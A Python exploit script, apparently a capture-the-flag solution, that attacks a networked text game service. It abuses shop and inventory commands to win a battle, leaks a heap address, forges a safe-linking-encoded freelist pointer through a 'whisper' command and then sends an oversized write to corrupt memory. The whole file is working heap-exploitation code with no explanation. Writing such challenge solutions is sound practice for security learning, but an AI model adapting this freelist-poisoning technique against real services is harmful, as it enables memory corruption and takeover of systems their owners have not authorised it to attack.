#!/usr/bin/env python3
import socket, time, re, struct, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2]); TARGET=int(sys.argv[3],16)
def connect_until_banner(tries=40):
    for i in range(tries):
        s=socket.socket(); s.settimeout(4)
        try: s.connect((HOST,PORT))
        except Exception: time.sleep(3); continue
        s.settimeout(2); b=b""
        try:
            while True:
                d=s.recv(4096)
                if not d: break
                b+=d
                if b"Great Plateau" in b: return s,b
        except Exception: pass
        s.close(); time.sleep(3)
    return None,None
def rx(s,pats,timeout=2.0):
    if isinstance(pats,str): pats=[pats]
    end=time.time()+timeout; out=b""
    while time.time()<end:
        s.settimeout(max(0.05,end-time.time()))
        try: d=s.recv(65536)
        except Exception: break
        if not d: out+=b"<EOF>"; break
        out+=d
        if any(p in out.decode('utf-8','replace') for p in pats): break
    return out.decode('utf-8','replace')
def cmd(s,c,pats,t=2.0):
    s.sendall(c.encode()+b"\n"); time.sleep(0.03); return rx(s,pats,t)
s,b=connect_until_banner()
if s is None: print("NO BANNER"); sys.exit(1)
# win
for i in range(5):
    cmd(s,"shop buy 1 1",["tx: item added","not enough"])
    cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    cmd(s,"mw throw 0",["throws equipped item","invalid"])
    cmd(s,"mw pickup 0",["tx: item added","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    time.sleep(0.2)
cmd(s,"shop buy 3 34",["tx:","not enough"],3)
cmd(s,"map teleport castle",["Encounter"])
cmd(s,"battle",["player turn"])
cmd(s,"use item",["Enter inventory idx"])
cmd(s,"1",["Enter quantity"])
cmd(s,"34",["Battle won"],4)
cmd(s,"mw pickup 0",["tx: item added","invalid"])
cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
o=cmd(s,"mw show",["Drops:"])
m=re.search(r"description_addr=0x([0-9a-f]+)",o); base=int(m.group(1),16)
print("[base] "+hex(base))
cmd(s,"inv drop 1",["inventory frees","invalid"])
o=cmd(s,"mw show",["Drops:"])
m=re.search(r"description_head=0x([0-9a-f]+)",o); print("[head after inv drop] "+m.group(1) if m else "none")
fd=TARGET^(base>>12)
hexA=struct.pack("<Q",fd).hex()
cmd(s,"mw whisper 0 "+hexA,["whispered","only"],3)
o=cmd(s,"mw show",["Drops:"])
m=re.search(r"description_head=0x([0-9a-f]+)",o); print("[head after poison] "+m.group(1) if m else "none")
print("[expected enc(T)] "+hex(fd), flush=True)
# whisper long
o=cmd(s,"mw whisper 0 "+"41"*0x160,["whispered","only","<EOF>"],3)
print("[long out] "+o.strip().splitlines()[-1][:60] if o else "?", flush=True)
time.sleep(0.2)
try:
    s.sendall(b"mw show\n"); time.sleep(0.3); s.settimeout(1); t=b""
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            t+=d
    except Exception: pass
    print("[alive] "+repr(t[:80]),flush=True)
except Exception as e: print("[DEAD/segv] "+str(e),flush=True)
s.close()
